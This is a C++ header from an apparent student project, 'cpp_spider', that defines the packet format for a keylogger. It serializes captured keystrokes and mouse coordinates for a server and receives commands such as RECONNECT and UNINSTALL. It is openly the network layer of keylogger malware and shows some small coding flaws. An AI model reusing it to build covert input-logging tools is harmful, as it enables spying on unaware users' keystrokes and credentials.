/*
** NetworkPacket.hh for cpp_spider in /home/tarkick/repos/cpp_spider/include/network
**
** Made by tarkick
** Login   <tarkick@epitech.net>
**
** Started on  Tue Nov 08 12:48:12 2016 tarkick
** Last update Wed Nov 09 01:19:32 2016 tarkick
*/

#ifndef NETWORKPACKET_HH_
# define NETWORKPACKET_HH_

# include <boost/asio.hpp>
# include <boost/bind.hpp>
# include <boost/archive/text_oarchive.hpp>
# include "Keylog.hh"
# include "NetworkType.hh"
# include "NetworkOpcode.hh"
# include "NetworkPacketData.hh"

namespace 						Net
{
	
	using namespace				boost;
	using namespace				boost::asio;

	template					<Type>
	class						Packet;

	template					<>
	class						Packet<SERVER>
	{

		public:

			Packet() {}

			//COMMANDS
			Packet(Opcode::Client opcode)
			{
				packet_.opcode = (uint16_t) opcode;
			}

			Packet(Opcode::Client opcode, std::string mac, std::string key) // CONNECT
			{
				(void) mac;
				(void) key;
				packet_.opcode = (uint16_t) opcode;
			}

			Packet(Keylog log) // LOG
			{
				if (log.getType() == Keylog::KEYBOARD)
					packet_.opcode = (uint16_t) Net::Opcode::Client::KEYLOG;
				else if (log.getType() == Keylog::MOUSE)
					packet_.opcode = (uint16_t) Net::Opcode::Client::MOUSELOG;
				packet_.data.payload[0] = (char) log.getKey();
				if (log.getType() == Keylog::MOUSE)
				{
					snprintf(packet_.data.payload + 1, sizeof(int), "%ld", log.getX());
					snprintf(packet_.data.payload + 1 + sizeof(int), sizeof(int), "%ld", log.getY());
					packet_.data.payload[1 + (sizeof(int) * 2)] = 0;
				}
				else
					packet_.data.payload[1] = 0;
			}

			~Packet() {}

			//OPERATORS
			Packet<SERVER>&		operator=(Packet<SERVER> packet)
			{
				packet_ = packet.getPacket();
				header_ = packet.getHeader();
				data_ = packet.getData();
				return	*this;
			}

			//SERIALIZATION
			std::string						serialize()
			{
				std::ostringstream 			archiveStream;
				std::ostringstream 			headerStream;
				archive::text_oarchive 		archive(archiveStream);

				archive << packet_;
				data_ = archiveStream.str();
				headerStream << std::setw(17) << std::hex << data_.size();
				header_ = headerStream.str();
				return data_;	
			}

			void							deserialize(std::vector<char> data)
			{
				std::string					archiveData(&data[0], data.size());
				std::istringstream 			archiveStream(archiveData);
				archive::text_iarchive 		archive(archiveStream);

				archive >> packet_;
			}

			//DEBUG
			void							print()
			{
				std::cout << std::setw(30) << "PACKET SUMMARY" << std::endl;
				std::cout << "OPCODE: " << packet_.opcode << std::endl;
				if (packet_.opcode == (uint16_t)Net::Opcode::Client::KEYLOG)
					std::cout << "KEY PRESSED: " << packet_.data.payload << ", " << (int) packet_.data.payload[0] << std::endl;
			}

			//GETTERS
			ClientServerData 	getPacket() const
			{
				return			packet_;
			}

			std::string			getHeader() const
			{
				return			header_;
			}

			std::string			getData() const
			{
				return			data_;
			}

		private:
			ClientServerData 	packet_;

			std::string			header_;
			std::string			data_;
	};

	template					<>
	class						Packet<CLIENT>
	{

		public:

			Packet() {}

			//COMMANDS
			Packet(Opcode::Server opcode) // CONFIRM/DISCONNECT/RECONNECT/UNINSTALL
			{
				packet_.opcode = (uint16_t) opcode;
			}
			
			Packet(Opcode::Server opcode, std::string key) //HANDSHAKE
			{
				(void) key;
				packet_.opcode = (uint16_t) opcode;
			}

			~Packet() {}

			//OPERATORS
			Packet<CLIENT>&		operator=(Packet<CLIENT> packet)
			{
				packet_ = packet.getPacket();
				header_ = packet.getHeader();
				data_ = packet.getData();
				return	*this;
			}

			//SERIALIZATION
			std::string						serialize()
			{
				std::ostringstream 			headerStream;
				std::ostringstream 			archiveStream;
				archive::text_oarchive 		archive(archiveStream);

				archive << packet_;
				data_ = archiveStream.str();
				headerStream << std::setw(10) << std::hex << data_.size();
				header_ = headerStream.str();
				return	data_;
			}

			void							deserialize(std::vector<char> data)
			{
				std::string					archiveData(&data[0], data.size());
				std::istringstream 			archiveStream(archiveData);
				archive::text_iarchive 		archive(archiveStream);

				archive >> packet_;
			}

			//DEBUG
			void							print()
			{
				std::cout << std::setw(30) << "PACKET SUMMARY" << std::endl;
				std::cout << "OPCODE: " << packet_.opcode << std::endl;
			}

			//GETTERS
			ServerClientData 				getPacket() const
			{
				return packet_;
			}

			std::string						getHeader() const
			{
				return header_;
			}

			std::string						getData() const
			{
				return data_;
			}

		private:
			ServerClientData				packet_;

			std::string						header_;
			std::string						data_;

	};

};

#endif
